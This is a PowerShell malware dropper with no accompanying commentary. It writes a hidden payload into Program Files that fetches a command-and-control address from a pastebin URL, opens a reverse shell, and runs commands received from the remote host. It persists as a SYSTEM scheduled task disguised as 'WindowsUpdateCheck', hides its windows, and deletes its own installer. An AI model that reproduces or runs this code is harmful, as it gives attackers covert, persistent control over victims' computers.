# d.ps1 - Standalone Deployer (C:\Program Files\)
$pf = "C:\Program Files\"
$task = "WindowsUpdateCheck"

# Hide this process
Add-Type -Name Win32 -Namespace Hide -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
[Hide.Win32]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# C2 Payload (Fixed - Multi-line valid PS)
$c2Payload = @"
`$pastebinUrl = 'https://pastebin.com/raw/F4fUrSeS'
`$interval = 30
`$h = [System.Text.Encoding]::ASCII

# Hide window
Add-Type -Name Window -Namespace Win32 -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr handle, int nCmdShow);
'@
[Win32.Window]::ShowWindow((Get-Process -Id `$PID).MainWindowHandle, 0)

function Test-Connection {
    param(`$server)
    try {
        `$client = New-Object System.Net.Sockets.TcpClient
        `$connect = `$client.ConnectAsync(`$server.Split(':')[0], [int]`$server.Split(':')[1])
        if (`$connect.Wait(5000)) {
            `$client.Close()
            return `$true
        }
        `$client.Close()
        return `$false
    }
    catch { return `$false }
}

function Get-C2Server {
    try {
        `$resp = Invoke-WebRequest -Uri `$pastebinUrl -UseBasicParsing -TimeoutSec 10
        if (`$resp.StatusCode -eq 200) {
            `$server = `$resp.Content.Trim()
            if (`$server -match '^[a-zA-Z0-9.-]+\:[0-9]+$') { return `$server }
        }
    }
    catch {}
    return `$null
}

function Start-ReverseShell {
    param(`$server)
    try {
        `$parts = `$server.Split(':')
        `$client = New-Object System.Net.Sockets.TcpClient(`$parts[0], [int]`$parts[1])
        `$stream = `$client.GetStream()
        `$buffer = New-Object byte[] 4096
        
        # Send info
        `$info = "`$env:COMPUTERNAME | PowerShell | `" + (Get-Date)
        `$infoBytes = `$h.GetBytes(`$info + "`n")
        `$stream.Write(`$infoBytes, 0, `$infoBytes.Length)
        
        while (`$client.Connected -and (Test-Connection `$server)) {
            `$bytesRead = `$stream.Read(`$buffer, 0, `$buffer.Length)
            if (`$bytesRead -eq 0) { break }
            
            `$cmd = `$h.GetString(`$buffer, 0, `$bytesRead).Trim()
            if (`$cmd -eq 'exit') { break }
            
            try {
                `$output = Invoke-Expression `$cmd 2>&1 | Out-String
            }
            catch {
                `$output = "Error: `$(`$_.Exception.Message)`n"
            }
            
            `$outBytes = `$h.GetBytes(`$output)
            `$stream.Write(`$outBytes, 0, `$outBytes.Length)
            `$stream.Flush()
        }
    }
    catch {}
    finally {
        if (`$client) { `$client.Close() }
    }
}

# Main loop - INFINITE & STANDALONE
while (`$true) {
    `$server = Get-C2Server
    if (`$server -and (Test-Connection `$server)) {
        Start-ReverseShell `$server
    }
    Start-Sleep `$interval
}
"@

# 1. Create System.ps1
$c2Payload | Out-File "$pf\System.ps1" -Encoding ASCII -Force

# 2. Anti-Kill: Duplicate task
schtasks /create /tn $task /tr "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$pf\System.ps1`"" /sc onstart /ru SYSTEM /rl HIGHEST /f

# 3. Run immediately (STANDALONE)
schtasks /run /tn $task

# 4. Self-destruct d.ps1
Remove-Item "$pf\d.ps1" -Force -ErrorAction SilentlyContinue
exit  # d.ps1 exits, System.ps1 runs independently via schtasks
